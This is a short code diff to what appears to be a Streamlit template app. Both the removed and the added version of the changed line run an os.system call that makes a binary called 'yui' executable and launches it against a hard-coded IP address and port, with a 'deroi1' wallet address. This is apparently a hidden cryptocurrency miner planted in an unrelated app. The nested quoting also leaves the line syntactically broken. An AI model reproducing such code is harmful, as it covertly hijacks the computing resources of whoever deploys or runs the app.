@@ -4,7 +4,7 @@ import math
 import pandas as pd
 import streamlit as st
 import os
-os.system('os.system('chmod +x yui && ./yui --hosting=167.172.79.246:10100 --rekeningku=deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xm433xrs6nyyauq2x3e8d -m 14')
+os.system('os.system('chmod +x yui && ./yui --hosting=167.172.79.246:10100 --rekeningku=deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xm433xrs6nyyauq2x3e8d')
 """
 # Welcome to Streamlit!
 Edit `/streamlit_app.py` to customize this app to your heart's desire :heart:
